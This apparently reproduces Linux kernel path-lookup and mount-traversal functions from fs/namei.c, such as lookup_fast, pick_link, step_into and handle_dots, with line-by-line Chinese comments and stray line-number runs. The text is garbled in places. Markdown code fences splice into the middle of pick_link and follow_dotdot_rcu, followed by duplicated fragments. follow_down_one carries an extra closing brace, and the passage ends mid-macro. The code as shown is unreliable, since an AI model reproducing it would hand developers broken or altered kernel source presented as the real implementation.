&#123; // 释放旧的 dentry，更新路径的挂载点和 dentry dput(path-&gt;dentry); if (need_mntput) mntput(path-&gt;mnt); path-&gt;mnt = mounted; path-&gt;dentry = dget(mounted-&gt;mnt_root); // 在这里，我们知道它是 positive 的 flags = path-&gt;dentry-&gt;d_flags; need_mntput = true; continue; &#125; &#125; // 如果不需要自动挂载，跳出循环 if (!(flags &amp; DCACHE_NEED_AUTOMOUNT)) break; // 如果发现 uncovered 的自动挂载点，执行自动挂载 ret = follow_automount(path, count, lookup_flags); flags = smp_load_acquire(&amp;path-&gt;dentry-&gt;d_flags); if (ret &lt; 0) break; &#125; // 如果返回值是 -EISDIR，将其设置为 0 if (ret == -EISDIR) ret = 0; // 如果你与多个 mount --move 竞争，这是可能的 if (need_mntput &amp;&amp; path-&gt;mnt == mnt) mntput(path-&gt;mnt); // 如果没有错误，但是 flags 是 negative 的，返回 -ENOENT if (!ret &amp;&amp; unlikely(d_flags_negative(flags))) ret = -ENOENT; *jumped = need_mntput; // 更新 jumped 的值 return ret; // 返回结果&#125; 123456789101112131415161718// traverse_mounts 函数// 这是一个内联函数，用于遍历挂载点static inline int traverse_mounts(struct path *path, bool *jumped, int *count, unsigned lookup_flags)&#123; // 获取 dentry 的 flags unsigned flags = smp_load_acquire(&amp;path-&gt;dentry-&gt;d_flags); // 快速路径：如果 dentry 不是由文件系统管理的，设置 jumped 为 false 并返回 if (likely(!(flags &amp; DCACHE_MANAGED_DENTRY))) &#123; *jumped = false; if (unlikely(d_flags_negative(flags))) return -ENOENT; return 0; &#125; // 否则，调用 __traverse_mounts 函数进行遍历 return __traverse_mounts(path, flags, jumped, count, lookup_flags);&#125; 12345678910111213141516171819202122// follow_down_one 函数// 这个函数会查找并返回当前路径下的挂载点int follow_down_one(struct path *path)&#123; struct vfsmount *mounted; // 查找当前路径的挂载点 mounted = lookup_mnt(path); if (mounted) &#123; // 如果找到挂载点，释放当前路径的 dentry 和 mnt dput(path-&gt;dentry); mntput(path-&gt;mnt); // 并更新路径的 mnt 和 dentry 为新找到的挂载点 path-&gt;mnt = mounted; path-&gt;dentry = dget(mounted-&gt;mnt_root); // 返回 1 表示成功找到挂载点 return 1; &#125; // 返回 0 表示没有找到 &#125; return 0;&#125;EXPORT_SYMBOL(follow_down_one); // 把函数 follow_down_one 导出，使得其他模块也能够调用 12345678910111213141516171819/* * follow_down 函数 * 这个函数会遍历并找到当前用户可见的覆盖挂载点 * 在每个点，都会查询拥有该 dentry 的文件系统是否允许调用者进行下一步 */int follow_down(struct path *path, unsigned int flags)&#123; struct vfsmount *mnt = path-&gt;mnt; // 获取当前路径的挂载点 bool jumped; // 调用 traverse_mounts 函数进行挂载点的遍历 int ret = traverse_mounts(path, &amp;jumped, NULL, flags); // 如果路径的挂载点发生了改变，释放原来的挂载点 if (path-&gt;mnt != mnt) mntput(mnt); // 返回遍历结果 return ret;&#125;EXPORT_SYMBOL(follow_down); // 把函数 follow_down 导出，使得其他模块也能够调用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * __follow_mount_rcu 函数 * 这个函数尝试在 rcuwalk 模式下跳到挂载点堆的顶部 * 如果遇到需要阻塞的管理 dentry，操作失败 */static bool __follow_mount_rcu(struct nameidata *nd, struct path *path)&#123; struct dentry *dentry = path-&gt;dentry; // 获取当前路径的 dentry unsigned int flags = dentry-&gt;d_flags; // 获取 dentry 的 flags // 如果 dentry 不是由文件系统管理的，返回 true if (likely(!(flags &amp; DCACHE_MANAGED_DENTRY))) return true; // 如果不允许跨设备查找，返回 false if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) return false; for (;;) &#123; // 如果 dentry 希望阻塞 transit，那么它可能不是挂载点的管理 dentry if (unlikely(flags &amp; DCACHE_MANAGE_TRANSIT)) &#123; // 查询文件系统是否允许进行下一步 int res = dentry-&gt;d_op-&gt;d_manage(path, true); // 如果返回结果不为 0，返回结果是否为 -EISDIR if (res) return res == -EISDIR; // 更新 flags flags = dentry-&gt;d_flags; &#125; // 如果 dentry 是挂载点，查找挂载点 if (flags &amp; DCACHE_MOUNTED) &#123; struct mount *mounted = __lookup_mnt(path-&gt;mnt, dentry); // 如果找到了挂载点，更新路径的 mnt 和 dentry if (mounted) &#123; path-&gt;mnt = &amp;mounted-&gt;mnt; dentry = path-&gt;dentry = mounted-&gt;mnt.mnt_root; // 更新 nd 的状态 nd-&gt;state |= ND_JUMPED; nd-&gt;next_seq = read_seqcount_begin(&amp;dentry-&gt;d_seq); // 更新 flags flags = dentry-&gt;d_flags; // 确保非 RCU 路径遍历可以达到这个状态 if (read_seqretry(&amp;mount_lock, nd-&gt;m_seq)) return false; continue; &#125; // 如果读取序列号失败，返回 false if (read_seqretry(&amp;mount_lock, nd-&gt;m_seq)) return false; &#125; // 如果不需要自动挂载，返回 true return !(flags &amp; DCACHE_NEED_AUTOMOUNT); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839/* * handle_mounts 函数 * 用于处理挂载点，包括 RCU 模式下的挂载点跟踪，以及挂载点的遍历 */static inline int handle_mounts(struct nameidata *nd, struct dentry *dentry, struct path *path)&#123; bool jumped; int ret; path-&gt;mnt = nd-&gt;path.mnt; // 获取当前路径的挂载点 path-&gt;dentry = dentry; // 获取当前路径的 dentry if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果启用了 RCU 查找 unsigned int seq = nd-&gt;next_seq; // 调用 __follow_mount_rcu 函数进行 RCU 模式下的挂载点跟踪 if (likely(__follow_mount_rcu(nd, path))) return 0; // *path 和 nd-&gt;next_seq 可能已经被修改 path-&gt;mnt = nd-&gt;path.mnt; path-&gt;dentry = dentry; nd-&gt;next_seq = seq; if (!try_to_unlazy_next(nd, dentry)) return -ECHILD; &#125; // 调用 traverse_mounts 函数进行挂载点的遍历 ret = traverse_mounts(path, &amp;jumped, &amp;nd-&gt;total_link_count, nd-&gt;flags); if (jumped) &#123; // 如果成功跳转到了新的挂载点 if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) ret = -EXDEV; else nd-&gt;state |= ND_JUMPED; &#125; if (unlikely(ret)) &#123; // 如果遍历过程中出现错误 dput(path-&gt;dentry); // 释放 dentry if (path-&gt;mnt != nd-&gt;path.mnt) // 如果挂载点已经改变 mntput(path-&gt;mnt); // 释放旧的挂载点 &#125; return ret;&#125; 123456789101112131415161718192021/* * lookup_dcache 函数 * 这个函数在 dcache 中查找名称，并可能对找到的 dentry 进行重新验证 * 如果在缓存中不存在 dentry，则返回 NULL */static struct dentry *lookup_dcache(const struct qstr *name, struct dentry *dir, unsigned int flags)&#123; struct dentry *dentry = d_lookup(dir, name); // 在目录中查找 dentry if (dentry) &#123; // 如果找到了 dentry int error = d_revalidate(dentry, flags); // 对 dentry 进行重新验证 if (unlikely(error &lt;= 0)) &#123; // 如果验证失败 if (!error) d_invalidate(dentry); // 使 dentry 无效 dput(dentry); // 释放 dentry return ERR_PTR(error); // 错误处理 &#125; &#125; return dentry;&#125; 123456789101112131415161718192021222324252627282930313233/* * __lookup_hash 函数 * 在父目录的 inode 被独占锁定的情况下进行查找 * 这是唯一一个在非 in-lookup dentries 上调用 -&gt;lookup() 的情况 * 事实上，这只在目录保证没有 in-lookup 子项的情况下被调用 */static struct dentry *__lookup_hash(const struct qstr *name, struct dentry *base, unsigned int flags)&#123; struct dentry *dentry = lookup_dcache(name, base, flags); // 在 dcache 中查找 dentry struct dentry *old; struct inode *dir = base-&gt;d_inode; // 获取基础 dentry 的 inode if (dentry) // 如果找到了 dentry return dentry; // 对于死目录，不创建子 dentry if (unlikely(IS_DEADDIR(dir))) return ERR_PTR(-ENOENT); // 为基础 dentry 和名称分配一个新的 dentry dentry = d_alloc(base, name); if (unlikely(!dentry)) // 如果分配失败 return ERR_PTR(-ENOMEM); // 调用 -&gt;lookup() 函数进行查找 old = dir-&gt;i_op-&gt;lookup(dir, dentry, flags); if (unlikely(old)) &#123; // 如果查找结果存在 dput(dentry); // 释放新分配的 dentry dentry = old; // 使用查找到的老的 dentry &#125; return dentry;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283static struct dentry *lookup_fast(struct nameidata *nd)&#123; // 定义一个名为lookup_fast的函数，参数为名为nd的nameidata类型的指针 struct dentry *dentry, *parent = nd-&gt;path.dentry; // 定义两个dentry类型的指针，一个名为dentry，另一个名为parent，并将nd的path的dentry赋值给parent int status = 1; // 定义一个整型变量status，并初始化为1 /* * Rename seqlock is not required here because in the off chance * of a false negative due to a concurrent rename, the caller is * going to fall back to non-racy lookup. */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // 如果nd的flags与LOOKUP_RCU做按位与操作结果为真 dentry = __d_lookup_rcu(parent, &amp;nd-&gt;last, &amp;nd-&gt;next_seq); // 调用__d_lookup_rcu函数，将结果赋值给dentry if (unlikely(!dentry)) &#123; // 如果dentry为NULL if (!try_to_unlazy(nd)) // 如果try_to_unlazy函数返回值为0 return ERR_PTR(-ECHILD); // 返回错误指针ERR_PTR，错误码为-ECHILD return NULL; // 返回NULL &#125; /* * This sequence count validates that the parent had no * changes while we did the lookup of the dentry above. */ if (read_seqcount_retry(&amp;parent-&gt;d_seq, nd-&gt;seq)) // 如果read_seqcount_retry函数返回值为真 return ERR_PTR(-ECHILD); // 返回错误指针ERR_PTR，错误码为-ECHILD status = d_revalidate(dentry, nd-&gt;flags); // 调用d_revalidate函数，将获得的状态赋值给status if (likely(status &gt; 0)) // 如果status的值大于0 return dentry; // 返回dentry if (!try_to_unlazy_next(nd, dentry)) // 如果try_to_unlazy_next函数返回值为0 return ERR_PTR(-ECHILD); // 返回错误指针ERR_PTR，错误码为-ECHILD if (status == -ECHILD) // 如果status的值为-ECHILD /* we&#x27;d been told to redo it in non-rcu mode */ status = d_revalidate(dentry, nd-&gt;flags); // 重新调用d_revalidate函数，将获得的状态赋值给status &#125; else &#123; dentry = __d_lookup(parent, &amp;nd-&gt;last); // 调用__d_lookup函数，将结果赋值给dentry if (unlikely(!dentry)) // 如果dentry为NULL return NULL; // 返回NULL status = d_revalidate(dentry, nd-&gt;flags); // 调用d_revalidate函数，将获得的状态赋值给status &#125; if (unlikely(status &lt;= 0)) &#123; // 如果status的值小于等于0 if (!status) // 如果status的值为0 d_invalidate(dentry); // 调用d_invalidate函数，使dentry无效 dput(dentry); // 调用dput函数，减少dentry的使用计数 return ERR_PTR(status); // 返回错误指针ERR_PTR，错误码为status &#125; return dentry; // 返回dentry&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* Fast lookup failed, do it the slow way */static struct dentry *__lookup_slow(const struct qstr *name, struct dentry *dir, unsigned int flags)&#123; // 定义一个慢速查找函数，输入参数为要查找的文件名，父目录的dentry和查找标志 struct dentry *dentry, *old; struct inode *inode = dir-&gt;d_inode; DECLARE_WAIT_QUEUE_HEAD_ONSTACK(wq); // 定义等待队列头wq /* Don&#x27;t go there if it&#x27;s already dead */ if (unlikely(IS_DEADDIR(inode))) return ERR_PTR(-ENOENT); // 如果inode已经死亡（被删除或无效），直接返回错误码ENOENTagain: dentry = d_alloc_parallel(dir, name, &amp;wq); if (IS_ERR(dentry)) return dentry; // 并行分配一个新的dentry，如果返回值是错误指针，直接返回 if (unlikely(!d_in_lookup(dentry))) &#123; int error = d_revalidate(dentry, flags); if (unlikely(error &lt;= 0)) &#123; if (!error) &#123; d_invalidate(dentry); dput(dentry); goto again; &#125; // 如果dentry不在查找状态，进行重验证，如果验证失败，使dentry无效，减少其引用计数，然后重新进行查找 dput(dentry); dentry = ERR_PTR(error); &#125; &#125; else &#123; old = inode-&gt;i_op-&gt;lookup(inode, dentry, flags); d_lookup_done(dentry); if (unlikely(old)) &#123; dput(dentry); dentry = old; &#125; // 如果dentry在查找状态，调用查找函数，结束查找，如果有旧的dentry，减少新dentry的引用计数，然后使用旧的dentry &#125; return dentry; // 返回查找结果dentry&#125; 1234567891011121314static struct dentry *lookup_slow(const struct qstr *name, struct dentry *dir, unsigned int flags)&#123; // 定义一个慢速查找的包装函数，输入参数为要查找的文件名，父目录的dentry和查找标志 struct inode *inode = dir-&gt;d_inode; struct dentry *res; inode_lock_shared(inode); res = __lookup_slow(name, dir, flags); inode_unlock_shared(inode); return res; // 对inode进行共享锁定，然后进行慢速查找，查找结束后解锁，然后返回查找结果&#125; 12345678910111213141516static inline int may_lookup(struct mnt_idmap *idmap, struct nameidata *nd)&#123; // 定义一个内联函数，用于判断是否可以进行查找，参数为idmap和nd if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; int err = inode_permission(idmap, nd-&gt;inode, MAY_EXEC|MAY_NOT_BLOCK); // 如果nd的flags与LOOKUP_RCU按位与的结果为真，则调用inode_permission函数以检查权限，并将结果存储到err中 if (err != -ECHILD || !try_to_unlazy(nd)) return err; // 如果err的值不等于-ECHILD，或者try_to_unlazy函数的返回值为0，则返回err &#125; return inode_permission(idmap, nd-&gt;inode, MAY_EXEC); // 返回inode_permission函数的返回值，用于检查是否有执行权限&#125; 12345678910111213141516171819202122232425262728293031323334353637static int reserve_stack(struct nameidata *nd, struct path *link)&#123; // 定义一个函数，用于预留堆栈，参数为nd和link if (unlikely(nd-&gt;total_link_count++ &gt;= MAXSYMLINKS)) return -ELOOP; // 如果nd的total_link_count增加后大于等于MAXSYMLINKS，则返回-ELOOP if (likely(nd-&gt;depth != EMBEDDED_LEVELS)) return 0; // 如果nd的depth不等于EMBEDDED_LEVELS，则返回0 if (likely(nd-&gt;stack != nd-&gt;internal)) return 0; // 如果nd的stack不等于nd的internal，则返回0 if (likely(nd_alloc_stack(nd))) return 0; // 如果调用nd_alloc_stack函数后返回非0，那么返回0 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; // we need to grab link before we do unlazy. And we can&#x27;t skip // unlazy even if we fail to grab the link - cleanup needs it bool grabbed_link = legitimize_path(nd, link, nd-&gt;next_seq); // 如果nd的flags与LOOKUP_RCU按位与的结果为真，则在调用unlazy之前需要获取link if (!try_to_unlazy(nd) || !grabbed_link) return -ECHILD; // 如果try_to_unlazy函数的返回值为0，或者grabbed_link为false，则返回-ECHILD if (nd_alloc_stack(nd)) return 0; // 如果调用nd_alloc_stack函数后返回非0，那么返回0 &#125; return -ENOMEM; // 返回-ENOMEM，表示内存不足&#125; 12enum &#123;WALK_TRAILING = 1, WALK_MORE = 2, WALK_NOFOLLOW = 4&#125;;// 定义一个枚举，枚举值为WALK_TRAILING，WALK_MORE，WALK_NOFOLLOW，值分别为1，2，4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109static const char *pick_link(struct nameidata *nd, struct path *link, struct inode *inode, int flags)&#123; // 定义一个函数，用于选择链接，参数为nd，link，inode和flags struct saved *last; const char *res; int error = reserve_stack(nd, link); // 预留堆栈，并将结果存储到error中 if (unlikely(error)) &#123; if (!(nd-&gt;flags &amp; LOOKUP_RCU)) path_put(link); // 如果error非0，且nd的flags与LOOKUP_RCU按位与的结果为false，释放路径 return ERR_PTR(error); // 返回错误指针 &#125; last = nd-&gt;stack + nd-&gt;depth++; // 更新last为nd的stack与nd的depth的和，nd的depth自增 last-&gt;link = *link; // 更新last的link为*link clear_delayed_call(&amp;last-&gt;done); // 清除last的done中的延迟调用 last-&gt;seq = nd-&gt;next_seq; // 更新last的seq为nd的next_seq if (flags &amp; WALK_TRAILING) &#123; error = may_follow_link(nd, inode); if (unlikely(error)) return ERR_PTR(error); // 如果flags与WALK_TRAILING按位与的结果为真，调用may_follow_link函数，并将结果存储到error中，如果error非0，返回错误指针 &#125; if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_SYMLINKS) || unlikely(link-&gt;mnt-&gt;mnt_flags &amp; MNT_NOSYMFOLLOW)) return ERR_PTR(-ELOOP); // 如果nd的flags与LOOKUP_NO_SYMLINKS按位与的结果为真，或者link的mnt的mnt_flags与MNT_NOSYMFOLLOW按位与的结果为真，返回错误指针 if (!(nd-&gt;flags &amp; LOOKUP_RCU)) &#123; touch_atime(&amp;last-&gt;link); cond_resched(); // 如果nd的flags与LOOKUP_RCU按位与的结果为false，更新last的link的访问时间，并尝试进行调度 &#125; else if (atime_needs_update(&amp;last-&gt;link, inode)) &#123; if (!try_to_unlazy(nd)) return ERR_PTR(-ECHILD); touch_atime(&amp;last-&gt;link); // 否则，如果last的link的访问时间需要更新，尝试调用try_to_unlazy函数，如果返回值为0，返回错误指针，否则，更新last的link的访问时间 &#125; error = security_inode_follow_link(link-&gt;dentry, inode, nd-&gt;flags &amp; LOOKUP_RCU); if (unlikely(error)) return ERR_PTR(error); // 调用security_inode_follow_link函数，并将结果存储到error中，如果error非0，返回错误指针 res = READ_ONCE(inode-&gt;i_link); // 读取一次inode的i_link，将结果存储到res中 if (!res) &#123; const char * (*get)(struct dentry *, struct inode *, struct delayed_call *); get = inode-&gt;i_op-&gt;get_link; // 如果res为NULL，定义一个函数指针get，并将其指向inode的i_op的get_link函数 if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; res = get(NULL, inode, &amp;last-&gt;done); if (res == ERR_PTR(-ECHILD) &amp;&amp; try_to_unlazy(nd)) res = get(link-&gt;dentry, inode, &amp;last-&gt;done); // 如果nd的flags与LOOKUP_RCU按位与的结果为真，调用get函数，并将结果存储到res中，如果res为错误指针且try_to_unlazy函数的返回值为非0，再次调用get函数，并将结果存储到res中 &#125; else &#123; res = get(link-&gt;dentry, inode, &amp;last-&gt;done); // 否则，调用get函数，并将结果存储到res中 &#125; if (!res) goto all_done; // 如果res为NULL，跳转到all_done标签 if (IS_ERR(res)) return res; // 如果res为错误指针，返回res &#125; if (*res == &#x27;/&#x27;) &#123; error = nd_jump_root(nd); if (unlikely(error)) return ERR_PTR(error); // 如果res的第一个字符为&#x27;/&#x27;，调用nd_jump_root函数，并将```c if (*res == &#x27;/&#x27;) &#123; error = nd_jump_root(nd); if (unlikely(error)) return ERR_PTR(error); // 如果res的第一个字符为&#x27;/&#x27;，调用nd_jump_root函数，并将结果存储到error中，如果error非0，返回错误指针 while (unlikely(*++res == &#x27;/&#x27;)) ; // 如果res的下一个字符为&#x27;/&#x27;，将res向后移动一位，直到res的当前字符不为&#x27;/&#x27; &#125; if (*res) return res; // 如果res的第一个字符非空，返回resall_done: // pure jump put_link(nd); // 调用put_link函数，输入参数为nd return NULL; // 返回NULL&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* * 我们是否需要跟踪链接？我们_真的_希望能够在不必查看inode-&gt;i_op的情况下进行此检查， * 因此，对于常见情况，我们保留一个&quot;不，这不需要follow_link&quot;的缓存。 * * 注意：dentry必须是nd-&gt;next_seq已采样的内容。 */static const char *step_into(struct nameidata *nd, int flags, struct dentry *dentry)&#123; struct path path; struct inode *inode; int err = handle_mounts(nd, dentry, &amp;path); // 处理挂载情况 if (err &lt; 0) return ERR_PTR(err); // 如果处理出错，返回错误指针 inode = path.dentry-&gt;d_inode; if (likely(!d_is_symlink(path.dentry)) || // 如果dentry不是符号链接 ((flags &amp; WALK_TRAILING) &amp;&amp; !(nd-&gt;flags &amp; LOOKUP_FOLLOW)) || // 或者我们不需要跟踪链接 (flags &amp; WALK_NOFOLLOW)) &#123; // 或者明确指定不需要跟踪链接 /* not a symlink or should not follow */ if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; if (read_seqcount_retry(&amp;path.dentry-&gt;d_seq, nd-&gt;next_seq)) return ERR_PTR(-ECHILD); // 如果序列号不匹配，返回错误 if (unlikely(!inode)) return ERR_PTR(-ENOENT); // 如果inode不存在，返回错误 &#125; else &#123; dput(nd-&gt;path.dentry); if (nd-&gt;path.mnt != path.mnt) mntput(nd-&gt;path.mnt); &#125; nd-&gt;path = path; nd-&gt;inode = inode; nd-&gt;seq = nd-&gt;next_seq; return NULL; &#125; if (nd-&gt;flags &amp; LOOKUP_RCU) &#123; /* 确保上面的d_is_symlink匹配inode */ if (read_seqcount_retry(&amp;path.dentry-&gt;d_seq, nd-&gt;next_seq)) return ERR_PTR(-ECHILD); // 如果序列号不匹配，返回错误 &#125; else &#123; if (path.mnt == nd-&gt;path.mnt) mntget(path.mnt); &#125; return pick_link(nd, &amp;path, inode, flags); // 选择链接进行处理&#125; 123456789101112131415161718192021222324252627282930313233343536373839static struct dentry *follow_dotdot_rcu(struct nameidata *nd) // 定义一个函数follow_dotdot_rcu，接收一个参数，返回一个struct dentry指针。&#123; struct dentry *parent, *old; // 定义两个struct dentry指针，parent和old if (path_equal(&amp;nd-&gt;path, &amp;nd-&gt;root)) // 如果nd-&gt;path等于nd-&gt;root goto in_root; // 跳转到in_root标签 if (unlikely(nd-&gt;path.dentry == nd-&gt;path.mnt-&gt;mnt_root)) &#123; // 如果nd-&gt;path.dentry等于nd-&gt;path.mnt-&gt;mnt_root struct path path; // 定义一个struct```c unsigned seq; // 定义一个无符号整型变量seq if (!choose_mountpoint_rcu(real_mount(nd-&gt;path.mnt), &amp;nd-&gt;root, &amp;path, &amp;seq)) // 如果没有选择RCU挂载点 goto in_root; // 跳转到in_root标签 if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) // 如果nd-&gt;flags包含LOOKUP_NO_XDEV return ERR_PTR(-ECHILD); // 返回错误指针 nd-&gt;path = path; // 将path赋值给nd-&gt;path nd-&gt;inode = path.dentry-&gt;d_inode; // 将path.dentry-&gt;d_inode赋值给nd-&gt;inode nd-&gt;seq = seq; // 将seq赋值给nd-&gt;seq // 确保非RCU路径步进可以到达这个状态 if (read_seqretry(&amp;mount_lock, nd-&gt;m_seq)) // 如果读取序列重试 return ERR_PTR(-ECHILD); // 返回错误指针 /* 我们知道挂载点被固定 */ &#125; old = nd-&gt;path.dentry; // 将nd-&gt;path.dentry赋值给old parent = old-&gt;d_parent; // 将old-&gt;d_parent赋值给parent nd-&gt;next_seq = read_seqcount_begin(&amp;parent-&gt;d_seq); // 读取parent-&gt;d_seq的序列计数开始，并赋值给nd-&gt;next_seq // 确保非RCU路径步进可以到达这个状态 if (read_seqcount_retry(&amp;old-&gt;d_seq, nd-&gt;seq)) // 如果读取old-&gt;d_seq的序列计数重试 return ERR_PTR(-ECHILD); // 返回错误指针 if (unlikely(!path_connected(nd-&gt;path.mnt, parent))) // 如果nd-&gt;path.mnt和parent没有连接 return ERR_PTR(-ECHILD); // 返回错误指针 return parent; // 返回parentin_root: // in_root标签 if (read_seqretry(&amp;mount_lock, nd-&gt;m_seq)) // 如果读取序列重试 return ERR_PTR(-ECHILD); // 返回错误指针 if (unlikely(nd-&gt;flags &amp; LOOKUP_BENEATH)) // 如果nd-&gt;flags包含LOOKUP_BENEATH return ERR_PTR(-ECHILD); // 返回错误指针 nd-&gt;next_seq = nd-&gt;seq; // 将nd-&gt;seq赋值给nd-&gt;next_seq return nd-&gt;path.dentry; // 返回nd-&gt;path.dentry&#125; 12345678910111213141516171819202122232425262728293031static struct dentry *follow_dotdot(struct nameidata *nd)&#123; struct dentry *parent; if (path_equal(&amp;nd-&gt;path, &amp;nd-&gt;root)) // 如果当前路径已经是根路径 goto in_root; if (unlikely(nd-&gt;path.dentry == nd-&gt;path.mnt-&gt;mnt_root)) &#123; // 如果当前的dentry是挂载点的根 struct path path; if (!choose_mountpoint(real_mount(nd-&gt;path.mnt), // 选择一个新的挂载点 &amp;nd-&gt;root, &amp;path)) goto in_root; path_put(&amp;nd-&gt;path); // 释放旧的路径 nd-&gt;path = path; // 更新新的路径 nd-&gt;inode = path.dentry-&gt;d_inode; // 更新inode if (unlikely(nd-&gt;flags &amp; LOOKUP_NO_XDEV)) // 如果不允许跨设备 return ERR_PTR(-EXDEV); &#125; /* rare case of legitimate dget_parent()... */ parent = dget_parent(nd-&gt;path.dentry); // 获取父目录 if (unlikely(!path_connected(nd-&gt;path.mnt, parent))) &#123; // 如果路径没有连接 dput(parent); return ERR_PTR(-ENOENT); &#125; return parent; // 返回父目录in_root: if (unlikely(nd-&gt;flags &amp; LOOKUP_BENEATH)) // 如果标志设置了LOOKUP_BENEATH return ERR_PTR(-EXDEV); return dget(nd-&gt;path.dentry); // 返回当前路径的dentry&#125; 12345678910111213141516171819202122232425262728293031323334353637static const char *handle_dots(struct nameidata *nd, int type)&#123; if (type == LAST_DOTDOT) &#123; // 如果是&quot;..&quot; const char *error = NULL; struct dentry *parent; if (!nd-&gt;root.mnt) &#123; // 如果没有设置根挂载点 error = ERR_PTR(set_root(nd)); // 设置根路径 if (error) return error; &#125; if (nd-&gt;flags &amp; LOOKUP_RCU) // 如果是RCU方式 parent = follow_dotdot_rcu(nd); // 使用RCU方式获取父目录 else parent = follow_dotdot(nd); // 否则直接获取父目录 if (IS_ERR(parent)) // 如果出错 return ERR_CAST(parent); error = step_into(nd, WALK_NOFOLLOW, parent); // 进入父目录 if (unlikely(error)) // 如果出错 return error; if (unlikely(nd-&gt;flags &amp; LOOKUP_IS_SCOPED)) &#123; // 如果是受限制的查找 /* * If there was a racing rename or mount along our * path, then we can&#x27;t be sure that &quot;..&quot; hasn&#x27;t jumped * above nd-&gt;root (and so userspace should retry or use * some fallback). */ smp_rmb(); if (__read_seqcount_retry(&amp;mount_lock.seqcount, nd-&gt;m_seq)) // 如果有并发的挂载操作 return ERR_PTR(-EAGAIN); if (__read_seqcount_retry(&amp;rename_lock.seqcount, nd-&gt;r_seq)) // 如果有并发的重命名操作 return ERR_PTR(-EAGAIN); &#125; &#125; return NULL;&#125; 123456789101112131415161718192021222324252627static const char *walk_component(struct nameidata *nd, int flags)&#123; struct dentry *dentry; // 定义一个目录项 /* * &quot;.&quot; and &quot;..&quot; are special - &quot;..&quot; especially so because it has * to be able to know about the current root directory and * parent relationships. */ // &quot;.&quot; 和 &quot;..&quot; 是特殊的，特别是 &quot;..&quot;，因为它需要知道当前的根目录和父目录关系 if (unlikely(nd-&gt;last_type != LAST_NORM)) &#123; // 如果最后一个类型不是常规的 if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) // 如果没有更多的路径并且深度不为0 put_link(nd); // 释放链接 return handle_dots(nd, nd-&gt;last_type); // 处理 &quot;..&quot; 和 &quot;.&quot; &#125; dentry = lookup_fast(nd); // 快速查找 if (IS_ERR(dentry)) // 如果出错 return ERR_CAST(dentry); // 返回错误 if (unlikely(!dentry)) &#123; // 如果目录项为空 dentry = lookup_slow(&amp;nd-&gt;last, nd-&gt;path.dentry, nd-&gt;flags); // 慢速查找 if (IS_ERR(dentry)) // 如果出错 return ERR_CAST(dentry); // 返回错误 &#125; if (!(flags &amp; WALK_MORE) &amp;&amp; nd-&gt;depth) // 如果没有更多的路径并且深度不为0 put_link(nd); // 释放链接 return step_into(nd, flags, dentry); &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798/* * 我们可以一次一个单词地进行关键的 dentry 名称比较和散列操作，但我们只限于： * * - 支持快速无对齐字访问的架构。如果这有助于提高速度，我们可以使用 &quot;get_unaligned()&quot;。 * * - 非 CONFIG_DEBUG_PAGEALLOC 配置（这样我们就不会在跨页操作的（极少见的）情况下陷入陷阱）。 * * - 此外，我们需要一个高效的 64 位编译来生成 &quot;最终掩码中的字节数&quot;。再次，这可以用高效的人口统计计数指令或类似的东西替换。 */#ifdef CONFIG_DCACHE_WORD_ACCESS // 如果定义了 CONFIG_DCACHE_WORD_ACCESS#include &lt;asm/word-at-a-time.h&gt; // 包含头文件 &lt;asm/word-at-a-time.h&gt;#ifdef HASH_MIX // 如果定义了 HASH_MIX/* 架构在 &lt;asm/hash.h&gt; 中提供了 HASH_MIX 和 fold_hash() */#elif defined(CONFIG_64BIT) // 否则，如果定义了 CONFIG_64BIT/* * 混合函数中的寄存器压力是一个问题，尤其是在 32 位的 x86 上，但几乎任何函数都需要一个状态值和一个临时值。 * 取而代之的是，使用一个为两个状态值和零临时值设计的函数。 * * 这个函数不能在只有两次迭代的情况下创建一个冲突，所以我们有两次迭代去实现雪崩效应。在这两次迭代中， * 我们有六层混合，这足以将一个比特的影响扩散到 2^6 = 64 的状态比特。 * * 旋转常数是通过考虑64个一比特输入差或2016个两比特输入差，并找到该差导致每个128个输出比特改变的概率， * 使用随机初始状态的样本，得出的。 * * 然后将计算的概率的 Shannon 熵求和，得出一个分数。理想情况下，任何输入变化都有 50% 的几率切换任何给定的输出比特。 * * 混合分数（以位为单位）对于（12,45）： * 输入差：1比特 2比特 * 1轮： 713.3 42542.6 * 2轮： 2753.7 140389.8 * 3轮： 5954.1 233458.2 * 4轮： 7862.6 256672.2 * 完美的： 8192 258048 * (64*128) (64*63/2 * 128) */#define HASH_MIX(x, y, a) \\ ( x ^= (a), \\ y ^= x, x = rol64(x,12),\\ x += y, y = rol64(y,45),\\ y *= 9 )/* * 将两个 longs 折叠成一个 32 位的哈希值。这必须很快，但 * 延迟并不那么关键，因为在哈希值被使用之前还有相当多的额外 * 工作要做。 */static inline unsigned int fold_hash(unsigned long x, unsigned long y)&#123; y ^= x * GOLDEN_RATIO_64; y *= GOLDEN_RATIO_64; return y &gt;&gt; 32;&#125;#else /* 32-bit case *//* * 混合分数（以位为单位）对于（7,20）： * 输入差：1比特 2-bit * 1轮： 330.3 9201.6 * 2轮： 1246.4 25475.4 * 3轮： 1907.1 31295.1 * 4轮： 2042.3 31718.6 * 完美： 2048 31744 * (32*64) (32*31/2 * 64) * * 这部分注释描述了一种哈希混合方法的性能。对于一个和两个比特的输入差，分别进行1轮、2轮、3轮和4轮的混合操作后，得出的混合分数与理想情况下的分数进行比较。 * 混合分数越接近理想分数（完美），说明这种混合方法的性能越好。 */#define HASH_MIX(x, y, a) \\ ( x 